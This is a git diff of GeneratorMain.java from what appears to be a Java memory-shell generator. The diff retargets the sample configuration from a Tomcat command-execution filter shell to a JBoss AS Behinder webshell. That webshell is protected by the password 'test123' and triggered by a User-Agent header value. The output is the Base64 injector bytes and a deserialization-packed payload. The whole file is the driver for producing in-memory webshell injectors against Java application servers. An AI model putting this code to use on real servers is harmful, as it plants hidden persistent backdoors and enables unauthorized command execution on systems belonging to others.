@@ -1,15 +1,18 @@
 package com.reajason.javaweb;
 
-import com.reajason.javaweb.config.*;
 import com.reajason.javaweb.memshell.AbstractShell;
+import com.reajason.javaweb.memshell.config.*;
 import com.reajason.javaweb.memshell.packer.Packer;
-import com.reajason.javaweb.util.CommonUtil;
+import com.reajason.javaweb.memshell.utils.CommonUtil;
 import lombok.SneakyThrows;
 import net.bytebuddy.jar.asm.Opcodes;
 import org.apache.commons.codec.binary.Base64;
 import org.apache.commons.lang3.StringUtils;
 
 import java.io.IOException;
+import java.nio.file.Files;
+import java.nio.file.Paths;
+import java.nio.file.StandardOpenOption;
 
 /**
  * @author ReaJason
@@ -19,8 +22,8 @@ public class GeneratorMain {
 
     public static void main(String[] args) throws IOException {
         ShellConfig shellConfig = ShellConfig.builder()
-                .server(Server.Tomcat)
-                .shellTool(ShellTool.Command)
+                .server(Server.JBossAS)
+                .shellTool(ShellTool.Behinder)
                 .shellType(Constants.FILTER)
                 .targetJreVersion(Opcodes.V1_6)
                 .debug(true)
@@ -30,14 +33,21 @@ public class GeneratorMain {
                 .key("key")
                 .headerName("User-Agent")
                 .headerValue("test123").build();
-        CommandConfig commandConfig = CommandConfig.builder().paramName("cmd").build();
+        CommandConfig commandConfig = CommandConfig.builder().paramName("listener").build();
+
+        BehinderConfig behinderConfig = BehinderConfig.builder()
+                .pass("test123")
+                .headerName("User-Agent")
+                .headerValue("test").build();
+
         InjectorConfig injectorConfig = new InjectorConfig();
-        GenerateResult generateResult = generate(shellConfig, injectorConfig, commandConfig);
+
+        GenerateResult generateResult = generate(shellConfig, injectorConfig, behinderConfig);
         if (generateResult != null) {
 //            Files.write(Paths.get(generateResult.getInjectorClassName() + ".class"), generateResult.getInjectorBytes(), StandardOpenOption.CREATE_NEW);
 //            Files.write(Paths.get(generateResult.getShellClassName() + ".class"), generateResult.getShellBytes(), StandardOpenOption.CREATE_NEW);
             System.out.println(Base64.encodeBase64String(generateResult.getInjectorBytes()));
-            System.out.println(Packer.INSTANCE.ScriptEngine.getPacker().pack(generateResult));
+            System.out.println(Packer.INSTANCE.Deserialize.getPacker().pack(generateResult));
         }
     }
 
